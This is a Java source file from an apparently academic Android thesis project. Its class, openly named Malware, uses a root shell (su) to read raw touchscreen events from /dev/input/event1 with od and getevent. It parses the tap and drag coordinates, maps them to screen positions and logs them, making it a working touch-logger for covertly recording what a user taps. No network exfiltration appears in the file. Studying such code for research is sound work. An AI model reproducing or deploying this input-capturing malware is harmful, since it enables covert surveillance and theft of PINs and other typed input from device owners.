package com.example.thesis;

import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Deque;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    // TODO: comments and rename things better (for example coords and abscoords)...
    private Deque<Deque<ABSCoordinates>> touchEventsABS;

    private boolean running = false;

    private float widthMultiplier;
    private float heightMultiplier;

    // ...
    List<BufferedReader> allBufferedReadersInput;
    List<BufferedReader> allBufferedReadersErrors;
    List<Process> allProcesses;


    public Malware(int screenX, int screenY) {
        this.allBufferedReadersInput = new ArrayList<>();
        this.allBufferedReadersErrors = new ArrayList<>();
        this.allProcesses = new ArrayList<>();

        this.touchEventsABS = new LinkedList<>();

        int[] absoluteCoordinates = getAbsoluteCoordinates();
        float absoluteX = absoluteCoordinates[0];
        float absoluteY = absoluteCoordinates[1];

        widthMultiplier = screenX / absoluteX;
        heightMultiplier = screenY / absoluteY;
    }


    @Override
    public void run() {
        Log.i("Malware", "Starting malware!");
        running = true;
        captureTouchEvents();
    }


    public void stop() {
        running = false;

        for (BufferedReader bufferedReader : allBufferedReadersInput) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                Log.e("Malware", "Failed to close BufferedReader: " + e.getMessage());
            }
        }
        for (BufferedReader bufferedReader : allBufferedReadersErrors) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                Log.e("Malware", "Failed to close BufferedReader: " + e.getMessage());
            }
        }
        for (Process process : allProcesses) {
            process.destroy();
        }
        Log.i("Malware", "Stopped malware!");
    }


    /**
     * Captures touch events and saves them as commands into the commands queue.
     * Helpful:
     * https://stackoverflow.com/questions/5711084/java-runtime-getruntime-getting-output-from-executing-a-command-line-program
     * https://stackoverflow.com/questions/18570962/permission-denied-on-rooted-android-phone-with-getevent
     */
    private void captureTouchEvents() {
        // Running command.
        BufferedReader bufferedReader = runRootCommand("od /dev/input/event1");

        // Reading result.
        String line;
        while (running) {
            Queue<String> event = readEvent(bufferedReader);
            Deque<ABSCoordinates> touchABSCoordinates = getCoordinates(event);
            touchEventsABS.add(touchABSCoordinates);
            Log.i("Malware", "Captured touch: " + convertToScreenCoordinates(new LinkedList<ABSCoordinates>(touchABSCoordinates)));
        }
    }


    private Queue<String> readEvent(BufferedReader bufferedReader) {
        Queue<String> eventLines = new LinkedList<>();
        String endOfEvent = "000003  000071  177777  177777";
        try {
            // Reading lines.
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                if (line.contains(endOfEvent)) {
                    eventLines.add(line);
                    eventLines.add(bufferedReader.readLine());
                    break;
                }
                eventLines.add(line);
            }
        } catch (Exception error) {
            Log.e("Malware ", "Error reading the event lines: " + error.getMessage());
        }
        return eventLines;
    }



    private EventType checkEventType(Queue<String> eventLines) {
        boolean isX = false;
        boolean isY = false;
        boolean dragging = false;

        // Checking if there are x and y coordinates.
        while(!eventLines.isEmpty()) {
            String line = eventLines.poll();
            String[] lineSplit = line.split("  ");

            if (lineSplit[6].equals("000065")) {
                isX = true;
            } else if (lineSplit[6].equals("000066")) {
                isY = true;
                break;
            }
        }

        // Checking if there are more x and y coordinates - indicating dragging event.
        while(!eventLines.isEmpty()) {
            String line = eventLines.poll();
            String[] lineSplit = line.split("  ");

            if (lineSplit[6].equals("000065") || lineSplit[6].equals("000066")) {
                dragging = true;
            }
        }

        // Returing what type of event it was by which coordinates were present.
        if (isX && isY && !dragging) {
            return EventType.NORMAL;
        } else if (dragging) {
            return EventType.DRAGGING;
        } else {
            return EventType.MULTIPLE_TAP;
        }
    }


    public Deque<ABSCoordinates> getCoordinates(Queue<String> eventLines) {
        EventType eventType = checkEventType(new LinkedList<String>(eventLines));

        if (eventType == EventType.NORMAL) {
            return getCoordinatesNORMAL(eventLines);
        } else if (eventType == EventType.MULTIPLE_TAP) {
            return getCoordinatesMULTIPLE_TAP(eventLines);
        } else {
            // EventType.DRAGGING
            return getCoordinatesDRAGGING(eventLines);
        }
    }


    public Deque<ABSCoordinates> getCoordinatesNORMAL (Queue<String> eventLines) {
        Deque<ABSCoordinates> touchEventABSCoordinates = new LinkedList<>();

        int absX = -1000;
        int absY = -1000;

        while(!eventLines.isEmpty()) {
            String line = eventLines.poll();
            String[] lineSplit = line.split("  ");

            if (lineSplit[6].equals("000065")) {
                // ABS_MT_POSITION_X == 000065
                absX = Integer.parseInt(lineSplit[7], 8);
            } else if (lineSplit[6].equals("000066")) {
                // ABS_MT_POSITION_Y == 000066
                absY = Integer.parseInt(lineSplit[7], 8);
            }
        }

        touchEventABSCoordinates.add(new ABSCoordinates(absX, absY));
        return touchEventABSCoordinates;
    }


    public Deque<ABSCoordinates> getCoordinatesMULTIPLE_TAP (Queue<String> eventLines) {
        Deque<ABSCoordinates> touchEventABSCoordinates = new LinkedList<>();

        touchEventABSCoordinates = touchEventsABS.removeLast();
        touchEventABSCoordinates.add(touchEventABSCoordinates.getLast());

        return touchEventABSCoordinates;
    }


    public Deque<ABSCoordinates> getCoordinatesDRAGGING (Queue<String> eventLines) {
        // TODO: this
        Deque<ABSCoordinates> touchEventABSCoordinates = new LinkedList<>();

        int absX = -1000;
        int absY = -1000;

        boolean isX = false, isY = false;
        while(!eventLines.isEmpty()) {
            String line = eventLines.poll();
            String[] lineSplit = line.split("  ");

            if (lineSplit[6].equals("000065")) {
                // ABS_MT_POSITION_X == 000065
                absX = Integer.parseInt(lineSplit[7], 8);
                isX = true;
            } else if (lineSplit[6].equals("000066")) {
                // ABS_MT_POSITION_Y == 000066
                absY = Integer.parseInt(lineSplit[7], 8);
                isY = true;
            } else if (
                    lineSplit[5].equals("000000") &&
                    lineSplit[6].equals("000000") &&
                    lineSplit[7].equals("000000") &&
                    lineSplit[8].equals("000000") &&
                            (isX || isY)) {
                // SYN_REPORT == ... 000000  000000  000000  000000 <- indicates end of this set of coordinates
                touchEventABSCoordinates.add(new ABSCoordinates(absX, absY));
                isX = false;
                isY = false;
            }
        }

        return touchEventABSCoordinates;
    }















    public Coordinates convertToScreenCoordinates(ABSCoordinates absCoordinates) {
        int screenX = Math.round(absCoordinates.getAbsX() * widthMultiplier);
        int screenY = Math.round(absCoordinates.getAbsY() * heightMultiplier);
        Coordinates screenCoordinates = new Coordinates(absCoordinates, screenX, screenY);
        return screenCoordinates;
    }


    public Deque<Coordinates> convertToScreenCoordinates(Deque<ABSCoordinates> absCoordinates) {
        Deque<Coordinates> coordinates = new LinkedList<>();

        while(!absCoordinates.isEmpty()) {
            ABSCoordinates abs = absCoordinates.poll();
            coordinates.add(convertToScreenCoordinates(abs));
        }

        return coordinates;
    }


    private BufferedReader runRootCommand(String command) {
        try {
            // Starting process as su.
            ProcessBuilder pb = new ProcessBuilder();
            pb.command("/system/bin/su");
            Process process = pb.start();

            // Sending the command.
            OutputStream outputStream = process.getOutputStream();
            outputStream.write((command + " \n").getBytes());
            outputStream.flush();

            // Buffered readers of outputs and error outputs.
            BufferedReader bufferedReaderInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader bufferedReaderErrors = new BufferedReader(new InputStreamReader(process.getErrorStream()));  // TODO: make it read errors aswell

            allBufferedReadersInput.add(bufferedReaderInput);
            allBufferedReadersErrors.add(bufferedReaderErrors);
            allProcesses.add(process);

            return bufferedReaderInput;
        } catch (Exception error) {
            Log.e("Malware", "Error running root command: " + error.getMessage());
        }
        return null;
    }


    private int[] getAbsoluteCoordinates() {
        // TODO: https://stackoverflow.com/questions/28215812/adb-shell-getevent-method-returns-twice-the-value-for-x-and-y-on-nexus-4/28217144#28217144
        try {
            BufferedReader bufferedReader = runRootCommand("getevent -il /dev/input/event1 | grep ABS_MT_POSITION");
            Pattern pattern = Pattern.compile(", max (.+), fuzz");
            int absoluteX = -1000;
            int absoluteY = -1000;

            String line;
            while ((line = bufferedReader.readLine()) != null) {
                Matcher matcher = pattern.matcher(line);
                if (matcher.find()) {
                    if (line.contains("ABS_MT_POSITION_X")) {
                        absoluteX = Integer.parseInt(matcher.group(1));
                    } else {
                        absoluteY = Integer.parseInt(matcher.group(1));
                        bufferedReader.close();
                        return new int[]{absoluteX, absoluteY};
                    }

                } else {
                    Log.e("Malware", "Couldn't find absolute resolution!");  // TODO: for testing, remove later.
                }
            }
            bufferedReader.close();
            return new int[]{absoluteX, absoluteY};
        } catch (IOException error) {
            Log.e("Malware", "Error getting absolute size of screen: " + error.getMessage());
        }
        return null;
    }
}


enum EventType {
    NORMAL,
    MULTIPLE_TAP,
    DRAGGING
}
